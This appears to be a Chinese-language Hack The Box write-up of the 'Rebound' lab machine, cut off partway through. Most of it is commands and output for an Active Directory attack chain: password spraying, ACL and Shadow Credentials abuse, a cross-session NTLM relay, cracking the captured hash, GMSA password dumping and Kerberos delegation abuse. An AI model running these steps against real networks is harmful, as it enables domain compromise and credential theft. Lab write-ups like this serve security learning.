<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">┌─[root@kali] - [~/hackthebox/machine/rebound] - [2557]</span><br><span class="line">└─[$] ntpdate rebound.htb                                                                                                                            [20:59:52]</span><br><span class="line">2024-04-06 04:17:13.7079 (-0500) +25202.758727 +/- 0.127430 rebound.htb 10.10.11.231 s1 no-leap</span><br><span class="line">CLOCK: time stepped by 25202.758727</span><br><span class="line">┌─[root@kali] - [~/hackthebox/machine/rebound] - [2558]</span><br><span class="line">└─[$] powerview rebound.htb/ldap_monitor:<span class="string">&#x27;1GR8t@$$4u&#x27;</span>@dc01.rebound.htb -k                                                                             [4:17:13]</span><br><span class="line">Logging directory is <span class="built_in">set</span> to /root/.powerview/logs/rebound.htb-dc01.rebound.htb</span><br><span class="line">(LDAPS)-[dc01.rebound.htb]-[rebound\ldap_monitor]</span><br><span class="line">PV &gt; Get-DomainObjectAcl -Identity Servicemgmt</span><br><span class="line">...</span><br><span class="line">ObjectDN                    : CN=ServiceMgmt,CN=Users,DC=rebound,DC=htb</span><br><span class="line">ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7683</span><br><span class="line">ACEType                     : ACCESS_ALLOWED_ACE</span><br><span class="line">ACEFlags                    : None</span><br><span class="line">ActiveDirectoryRights       : Self</span><br><span class="line">AccessMask                  : 0x8</span><br><span class="line">InheritanceType             : None</span><br><span class="line">SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)</span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound3.png"></li>
</ul>
<p>通过Self权限，orend可以将自己添加到组中。虽然目前没有这个用户的任何凭据，但是可以通过netexec喷射ldap_monitor的密码，希望能找到匹配的。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pipx install git+https://github.com/Pennyw0rth/NetExec</span><br><span class="line"></span><br><span class="line">λ ~/hackthebox/machine/rebound/ netexec smb dc01.rebound.htb -u usernames.txt -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> --continue-on-success</span><br><span class="line">SMB         10.10.11.231    445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)</span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\Administrator:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\Guest:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\krbtgt:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\DC01$:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\ppaul:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\llune:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\fflock:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\jjones:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\mmalone:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\nnoon:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.11.231    445    DC01             [+] rebound.htb\ldap_monitor:1GR8t@$<span class="variable">$4u</span></span><br><span class="line">SMB         10.10.11.231    445    DC01             [+] rebound.htb\oorend:1GR8t@$<span class="variable">$4u</span></span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\winrm_svc:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\batch_runner:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\tbrady:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE</span><br><span class="line">SMB         10.10.11.231    445    DC01             [-] rebound.htb\delegator$:1GR8t@$<span class="variable">$4u</span> STATUS_LOGON_FAILURE</span><br></pre></td></tr></table></figure>

<p>找到了oorend用户，这意味着现在可以将自己添加到组中。</p>
<p>回到powerview，这次是oorend。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">┌─[root@kali] - [~/hackthebox/machine/rebound] - [2559]</span><br><span class="line">└─[$] powerview rebound.htb/oorend:<span class="string">&#x27;1GR8t@$$4u&#x27;</span>@dc01.rebound.htb -k                                                                                   [4:24:53]</span><br><span class="line">Logging directory is <span class="built_in">set</span> to /root/.powerview/logs/rebound.htb-dc01.rebound.htb</span><br><span class="line">(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]</span><br><span class="line">PV &gt; Add-DomainGroupMember -Identity servicemgmt -Members oorend</span><br><span class="line">[2024-04-06 04:25:11] User oorend successfully added to servicemgmt</span><br></pre></td></tr></table></figure>

<h1 id="Descendant-Object-Takeover"><a href="#Descendant-Object-Takeover" class="headerlink" title="Descendant Object Takeover"></a>Descendant Object Takeover</h1><p>将自己添加到ServiceMgmt之后，现在在服务用户OU上拥有了GenericAll(也称为FullControl)。这允许将FullControl特权扩展到属于该OU的每个对象。在这种情况下，这些对象是winrm_svc和batch_runner:</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound4.png"></li>
</ul>
<p>为了执行攻击，使用dacledit.py，它也被打包到之前安装的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL1RoZVBvcmdzL2ltcGFja2V0LmdpdA==">Impacket的分支<i class="fa fa-external-link-alt"></i></span>中。</p>
<p>使用-inheritance标志，重写并扩展了当前的特权到子对象:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">(impacket-fork) [root@kali ~ ]$ dacledit.py rebound.htb/oorend:<span class="string">&#x27;1GR8t@$$4u&#x27;</span> -k -dc-ip 10.10.11.231 -action write -rights FullControl -inheritance -principal oorend -target-dn <span class="string">&quot;OU=Service Users,DC=rebound,DC=htb&quot;</span> -use-ldaps</span><br><span class="line">/root/impacket-fork/bin/dacledit.py:4: DeprecationWarning: pkg_resources is deprecated as an API. See https://setuptools.pypa.io/en/latest/pkg_resources.html</span><br><span class="line">  __import__(<span class="string">&#x27;pkg_resources&#x27;</span>).run_script(<span class="string">&#x27;impacket==0.10.1.dev1+20231106.134307.9aa93730&#x27;</span>, <span class="string">&#x27;dacledit.py&#x27;</span>)</span><br><span class="line">Impacket <span class="keyword">for</span> Exegol - v0.10.1.dev1+20231106.134307.9aa93730 - Copyright 2022 Fortra - forked by ThePorgs</span><br><span class="line"></span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[*] NB: objects with adminCount=1 will no inherit ACEs from their parent container/OU</span><br><span class="line">[*] DACL backed up to dacledit-20240406-043124.bak</span><br><span class="line">[*] DACL modified successfully!</span><br></pre></td></tr></table></figure>

<ul>
<li><p><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound5.png"></p>
</li>
<li><p>注意: 如果在这个阶段出现INSUFF_ACCESS_RIGHTS错误，请确保将oorend重新添加到ServiceMgmt组，因为该bxo的清理任务可能已经重置。</p>
</li>
</ul>
<p>检查winrm_svc或batch_runner对powerview的权限，看到oorend现在对两个对象都有FullControl (GenericAll):</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">(LDAPS)-[dc01.rebound.htb]-[rebound\oorend]</span><br><span class="line">PV &gt; Get-ObjectAcl -Identity winrm_svc -Where <span class="string">&quot;SecurityIdentifier contains oorend&quot;</span></span><br><span class="line">ObjectDN                    : CN=winrm_svc,OU=Service Users,DC=rebound,DC=htb</span><br><span class="line">ObjectSID                   : S-1-5-21-4078382237-1492182817-2568127209-7684</span><br><span class="line">ACEType                     : ACCESS_ALLOWED_ACE</span><br><span class="line">ACEFlags                    : CONTAINER_INHERIT_ACE, INHERITED_ACE, OBJECT_INHERIT_ACE</span><br><span class="line">ActiveDirectoryRights       : FullControl</span><br><span class="line">AccessMask                  : 0xf01ff</span><br><span class="line">InheritanceType             : None</span><br><span class="line">SecurityIdentifier          : oorend (S-1-5-21-4078382237-1492182817-2568127209-7682)</span><br></pre></td></tr></table></figure>

<p>使用FullControl权限，然后对winrm_svc执行<span class="exturl" data-url="aHR0cHM6Ly9wb3N0cy5zcGVjdGVyb3BzLmlvL3NoYWRvdy1jcmVkZW50aWFscy1hYnVzaW5nLWtleS10cnVzdC1hY2NvdW50LW1hcHBpbmctZm9yLXRha2VvdmVyLThlZTFhNTM1NjZhYg==">ShadowCredentials<i class="fa fa-external-link-alt"></i></span>攻击，因为这个名称暗示可能能够使用该帐户来恶意winrm连接到box中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">λ ~/hackthebox/machine/rebound/ certipy-ad shadow auto -u oorend@rebound.htb -p <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -account winrm_svc -target dc01.rebound.htb -dc-ip 10.10.11.231 -k</span><br><span class="line">Certipy v4.8.2 - by Oliver Lyak (ly4k)</span><br><span class="line"></span><br><span class="line">[*] Targeting user <span class="string">&#x27;winrm_svc&#x27;</span></span><br><span class="line">[*] Generating certificate</span><br><span class="line">[*] Certificate generated</span><br><span class="line">[*] Generating Key Credential</span><br><span class="line">[*] Key Credential generated with DeviceID <span class="string">&#x27;9f14b32c-1290-2a13-ef11-ae83e76fe810&#x27;</span></span><br><span class="line">[*] Adding Key Credential with device ID <span class="string">&#x27;9f14b32c-1290-2a13-ef11-ae83e76fe810&#x27;</span> to the Key Credentials <span class="keyword">for</span> <span class="string">&#x27;winrm_svc&#x27;</span></span><br><span class="line">[*] Successfully added Key Credential with device ID <span class="string">&#x27;9f14b32c-1290-2a13-ef11-ae83e76fe810&#x27;</span> to the Key Credentials <span class="keyword">for</span> <span class="string">&#x27;winrm_svc&#x27;</span></span><br><span class="line">[*] Authenticating as <span class="string">&#x27;winrm_svc&#x27;</span> with the certificate</span><br><span class="line">[*] Using principal: winrm_svc@rebound.htb</span><br><span class="line">[*] Trying to get TGT...</span><br><span class="line">[*] Got TGT</span><br><span class="line">[*] Saved credential cache to <span class="string">&#x27;winrm_svc.ccache&#x27;</span></span><br><span class="line">[*] Trying to retrieve NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;winrm_svc&#x27;</span></span><br><span class="line">[*] Restoring the old Key Credentials <span class="keyword">for</span> <span class="string">&#x27;winrm_svc&#x27;</span></span><br><span class="line">[*] Successfully restored the old Key Credentials <span class="keyword">for</span> <span class="string">&#x27;winrm_svc&#x27;</span></span><br><span class="line">[*] NT <span class="built_in">hash</span> <span class="keyword">for</span> <span class="string">&#x27;winrm_svc&#x27;</span>: 4469650fd892e98933b4536d2e86e512</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound6.png"></li>
</ul>
<p>检索到NT hash后，可以使用它来恶意入侵box。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">evil-winrm -i dc01.rebound.htb -u winrm_svc -H 4469650fd892e98933b4536d2e86e512</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound7.png"></li>
</ul>
<h1 id="cross-session-relay"><a href="#cross-session-relay" class="headerlink" title="cross-session relay"></a>cross-session relay</h1><p>检查系统上运行的进程可以发现在session 1中运行的许多任务，这表明可能有另一个用户登录到该box中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; ps</span><br><span class="line">Handles NPM(K) PM(K) WS(K) CPU(s) Id SI ProcessName</span><br><span class="line">------- ------ ----- ----- ------ -- -- -----------</span><br><span class="line">385 32 12032 20824 2576 0 certsrv</span><br><span class="line">462 18 2348 5588 392 0 csrss</span><br><span class="line">267 16 1968 5168 516 1 csrss</span><br><span class="line">361 15 3440 14940 5164 1 ctfmon</span><br><span class="line">400 33 16388 25152 2652 0 dfsrs</span><br><span class="line">158 8 1944 6356 2784 0 dfssvc</span><br><span class="line">285 14 3992 13876 3756 0 dllhost</span><br></pre></td></tr></table></figure>

<p>系统上经过身份验证的用户可以打开目标以进行cross-session攻击。为这个任务上传工具包，包括<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N1YmUweDAvS3JiUmVsYXk=">KrbRelay<i class="fa fa-external-link-alt"></i></span>和<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2FudG9uaW9Db2NvL1J1bmFzQ3M=">RunasCs<i class="fa fa-external-link-alt"></i></span>。</p>
<p><em><strong>虽然RunasCs在其Github版本中有预编译的可执行文件，但KrbRelay没有。该项目必须下载并在Windows机器上编译，这超出了本文的范围。确保使用最新版本，其中包括NTLM cross-session支持。</strong></em></p>
<p>使用RunAs，可以通过运行qwinsta来验证是否有人登录:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">.\RunasCs.exe oorend <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -l 9 <span class="string">&quot;qwinsta&quot;</span></span><br><span class="line"></span><br><span class="line"> SESSIONNAME       USERNAME                 ID  STATE   TYPE        DEVICE</span><br><span class="line">&gt;services                                    0  Disc</span><br><span class="line"> console           tbrady                    1  Active</span><br></pre></td></tr></table></figure>

<p>使用runa和KrbRelay的组合，可以强制来自tbrady的连接，这将生成hash。</p>
<p>为此，通过-ntlm指定NTLM身份验证，通过-session指定session号，并为具有正确权限的有效RPC服务指定CLSID，从README上列出的<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL2N1YmUweDAvS3JiUmVsYXkjY2xzaWRz">默认值<i class="fa fa-external-link-alt"></i></span>中选择(在Cross-Session Relay下，适用于Windows Server 2019)。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">*Evil-WinRM* PS C:\Users\winrm_svc\Documents&gt; ./RunasCs.exe oorend <span class="string">&#x27;1GR8t@$$4u&#x27;</span> -</span><br><span class="line">l 9 <span class="string">&quot;c:\users\winrm_svc\documents\KrbRelay.exe -ntlm -session 1 -clsid 354ff91b-</span></span><br><span class="line"><span class="string">5e49-4bdc-a8e6-1cb6c6877182 -port 10246&quot;</span></span><br><span class="line">[*] Auth Context: rebound\tbrady</span><br><span class="line">[*] Rewriting <span class="keyword">function</span> table</span><br><span class="line">[*] Rewriting PEB</span><br><span class="line">[*] GetModuleFileName: System</span><br><span class="line">[*] Init com server</span><br><span class="line">[*] GetModuleFileName: c:\<span class="built_in">users</span>\winrm_svc\documents\KrbRelay.exe</span><br><span class="line">[*] Register com server</span><br><span class="line">objref:TUVPVwEAAAAAAAAAAAAAAMAAAAAAAABGgQIAAAAAAADb8QujUWpk7EXlFOjCHVuIAigAAGwb//87FS6QsIPIYCIADAAHADEAMgA3AC4AMAAuADAALgAxAAAAAAAJAP//AAAeAP//AAAQAP//AAAKAP//AAAWAP//AAAfAP//AAAOAP//AAAAAA==:</span><br><span class="line"></span><br><span class="line">[*] Forcing cross-session authentication</span><br><span class="line">[*] Using CLSID: 354ff91b-5e49-4bdc-a8e6-1cb6c6877182</span><br><span class="line">[*] Spawning <span class="keyword">in</span> session 1</span><br><span class="line">[*] NTLM1</span><br><span class="line">4e544c4d535350000100000097b208e2070007002c00000004000400280000000a0063450000000f444330315245424f554e44</span><br><span class="line">[*] NTLM2</span><br><span class="line">4e544c4d53535000020000000e000e003800000015c289e25976b5afd38af057000000000000000086008600460000000a0063450000000f7200650062006f0075006e00640002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800b4a468ea5e87da010000000000000000000000005c00410070007000490044005c004b00507044400b7f0000</span><br><span class="line">[*] AcceptSecurityContext: SEC_I_CONTINUE_NEEDED</span><br><span class="line">[*] fContextReq: Delegate, MutualAuth, ReplayDetect, SequenceDetect, UseDceStyle, Connection, AllowNonUserLogons</span><br><span class="line">[*] NTLM3</span><br><span class="line">tbrady::rebound:5976b5afd38af057:781d933ebf471ba3a53f8fde38534ba5:0101000000000000b4a468ea5e87da01403a32a0d7d14b060000000002000e007200650062006f0075006e006400010008004400430030003100040016007200650062006f0075006e0064002e006800740062000300200064006300300031002e007200650062006f0075006e0064002e00680074006200050016007200650062006f0075006e0064002e0068007400620007000800b4a468ea5e87da0106000400060000000800300030000000000000000100000000200000324a7a4dc5cc35f66c25982fee19d22fd89b784aed0a551a1d262bb80a1919680a00100000000000000000000000000000000000090000000000000000000000</span><br><span class="line">System.UnauthorizedAccessException: Access is denied. (Exception from HRESULT: 0x80070005 (E_ACCESSDENIED))</span><br><span class="line">   at KrbRelay.IStandardActivator.StandardGetInstanceFromIStorage(COSERVERINFO pServerInfo, Guid&amp; pclsidOverride, IntPtr punkOuter, CLSCTX dwClsCtx, IStorage pstg, Int32 dwCount, MULTI_QI[] pResults)</span><br><span class="line">   at KrbRelay.Program.Main(String[] args)</span><br></pre></td></tr></table></figure>

<p>虽然最终得到了一个错误，但获得了thbrady的NTLM3 hash，将其保存到一个文件中并提供给john。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">john tbrady --wordlist=/usr/share/wordlists/rockyou.txt</span><br><span class="line"></span><br><span class="line">543BOMBOMBUNmanda (tbrady)</span><br></pre></td></tr></table></figure>

<p>通过枚举tbrady的权限，看到他在delegate$上拥有ReadGMSAPassword</p>
<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound8.png"></li>
</ul>
<p>组管理服务帐户(GMSA)涉及一种设置，其中Windows服务器通过为帐户创建复杂的随机密码来自主处理该帐户的密码。可以通过过滤delegate$的msDS-ManagedPassword属性来使用<span class="exturl" data-url="aHR0cHM6Ly9naXRodWIuY29tL0NyYXZhdGVSb3VnZS9ibG9vZHlBRA==">bloodyAD<i class="fa fa-external-link-alt"></i></span>dump它。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">[root@kali:~/bloodyAD on main]</span><br><span class="line"><span class="comment"># python bloodyAD.py -d rebound.htb -u tbrady -p &#x27;543BOMBOMBUNmanda&#x27; --host dc01.rebound.htb get object &#x27;delegator$&#x27; --resolve-sd --attr msDS-ManagedPassword</span></span><br><span class="line"></span><br><span class="line">distinguishedName: CN=delegator,CN=Managed Service Accounts,DC=rebound,DC=htb</span><br><span class="line">msDS-ManagedPassword.NTLM: aad3b435b51404eeaad3b435b51404ee:43e9069a73081ecfcbe1514e1d4e3bc8</span><br><span class="line">msDS-ManagedPassword.B64ENCODED: tstzpYhnwwC1LuLjL0MtLrXzhLdDe8HPWCmR5BxwR5Gg87pPdmKYlhqMUh7njfqjzauLXDCp0Ofk7V+yfqCu0f5t+5zS/SmOw5wdqERpgl/uyd6LdKk/ZJYHAhifOVFWl4svHJ787reCRKbS+44rzi1DM4CcY/LLKAzHevGe3NkHww8vILZUU6cQNcKSyteGPRmxK2iq05EUs8ggGBwxAHwXCm24U8gdc19ILeL8YTtbUy/n5t+t7/DScrDHK8O1Suo6yPJXP37UaDsbIWJiqGNgcSLyWPgT6hEhLkODEjsBiqAgDAYTkrR6YZ1jlQGr6bSd9o70rSN6lPoRlfkDyQ==</span><br><span class="line">[root@kali:~/bloodyAD on main]</span><br><span class="line"><span class="comment"># netexec ldap rebound.htb -u tbrady -p 543BOMBOMBUNmanda -k --gmsa</span></span><br><span class="line">SMB         rebound.htb     445    DC01             [*] Windows 10 / Server 2019 Build 17763 x64 (name:DC01) (domain:rebound.htb) (signing:True) (SMBv1:False)</span><br><span class="line">LDAP        rebound.htb     636    DC01             [+] rebound.htb\tbrady:543BOMBOMBUNmanda</span><br><span class="line">LDAP        rebound.htb     636    DC01             [*] Getting GMSA Passwords</span><br><span class="line">LDAP        rebound.htb     636    DC01             Account: delegator$           NTLM: 43e9069a73081ecfcbe1514e1d4e3bc8</span><br></pre></td></tr></table></figure>

<ul>
<li><img src="https://raw.githubusercontent.com/wiki/FDlucifer/FDlucifer.github.io/rebound9.png"></li>
</ul>
<p>delegator$’s hash: 43e9069a73081ecfcbe1514e1d4e3bc8</p>
<h1 id="Constrained-Delegation-KCD-Abuse"><a href="#Constrained-Delegation-KCD-Abuse" class="headerlink" title="Constrained Delegation (KCD) Abuse"></a>Constrained Delegation (KCD) Abuse</h1><p>攻击者可以利用Kerberos委托获得对重要资源的访问权，在某些情况下，甚至可以将其权限提升到域管理员的权限。两种特定形式的委托，约束委托和基于资源的约束委托(RBCD)，都使用称为<span class="exturl" data-url="aHR0cHM6Ly93d3cudGhlaGFja2VyLnJlY2lwZXMvYS1kL21vdmVtZW50L2tlcmJlcm9zI3NlcnZpY2UtZm9yLXVzZXItZXh0ZW5zaW9ucw==">Service-for-User (S4U)<i class="fa fa-external-link-alt"></i></span>的Kerberos扩展</p>
<p>虽然Bloodhound没有显示约束委托，但findDelegation.py显示delegator$实际上能够委托:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">findDelegation.py rebound.htb/oorend:<span class="string">&#x27;1GR8t@$$4u&#x27;</span> -dc-ip dc01.rebound.htb -k</span><br><span class="line"></span><br><span class="line">[*] Getting machine hostname</span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">AccountName  AccountType                          DelegationType                       DelegationRightsTo</span><br><span class="line">-----------  -----------------------------------  -----------------------------------  ---------------------</span><br><span class="line">DC01$        Computer                             Unconstrained                        N/A</span><br><span class="line">delegator$   ms-DS-Group-Managed-Service-Account  Constrained w/o Protocol Transition  http/dc01.rebound.htb</span><br></pre></td></tr></table></figure>

<ul>
<li>注意: 再一次，使用了之前安装的Impacket的ThePorgs分支。</li>
</ul>
<p>没有protocol transition的委托意味着不可能用经典的”getST”来滥用它。尝试这样做会导致Kerberos错误:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">getST.py rebound.htb/delegator\$ -hashes :43e9069a73081ecfcbe1514e1d4e3bc8 -dc-ip dc01.rebound.htb -spn http/dc01.rebound.htb -impersonate Administrator</span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> user</span><br><span class="line">[*] Impersonating Administrator</span><br><span class="line">[*] Requesting S4U2self</span><br><span class="line">[*] Requesting S4U2Proxy</span><br><span class="line">[-] Kerberos SessionError: KDC_ERR_BADOPTION(KDC cannot accommodate requested option)</span><br><span class="line">[-] Probably SPN is not allowed to delegate by user delegator$ or initial TGT not forwardable</span><br></pre></td></tr></table></figure>

<p>这是因为缺乏Protocol Transition，这意味着S4U2Self步骤不会产生可转发的票证，从而导致S4U2proxy步骤失败。</p>
<p>本质上，用户对自己的服务(S4U2self)协议使服务能够代表另一个用户请求服务票证，但用于自己的使用。相反，用户到代理服务(S4U2proxy)协议允许一个服务代表另一个用户请求服务票证，但是请求的是不同的服务。</p>
<p>可以通过执行S4U2Self并检查生成的票据来验证这一点。首先通过-self标志请求票证:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">getST.py rebound.htb/delegator\$ -hashes :43e9069a73081ecfcbe1514e1d4e3bc8 -dc-ip dc01.rebound.htb -spn http/dc01.rebound.htb -impersonate Administrator -self</span><br><span class="line">[-] CCache file is not found. Skipping...</span><br><span class="line">[*] Getting TGT <span class="keyword">for</span> user</span><br><span class="line">[*] Impersonating Administrator</span><br><span class="line">[*] When doing S4U2self only, argument -spn is ignored</span><br><span class="line">[*] Requesting S4U2self</span><br><span class="line">[*] Saving ticket <span class="keyword">in</span> Administrator@delegator<span class="variable">$@REBOUND</span>.HTB.ccache</span><br></pre></td></tr></table></figure>

<p>如果检查票证，看到可转发flag没有设置:</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">describeTicket.py Administrator@delegator\<span class="variable">$@REBOUND</span>.HTB.ccache</span><br><span class="line">[*] Number of credentials <span class="keyword">in</span> cache: 1</span><br><span class="line">[*] Parsing credential[0]:</span><br><span class="line">[*] Ticket Session Key            : 997cb2bd199848c134a230582eed4046</span><br><span class="line">[*] User Name                     : Administrator</span><br><span class="line">[*] User Realm                    : rebound.htb</span><br><span class="line">[*] Service Name                  : delegator$</span><br><span class="line">[*] Service Realm                 : REBOUND.HTB</span><br><span class="line">[*] Start Time                    : 05/04/2024 09:28:48 AM</span><br><span class="line">[*] End Time                      : 05/04/2024 19:28:48 PM</span><br><span class="line">[*] RenewTill                     : 06/04/2024 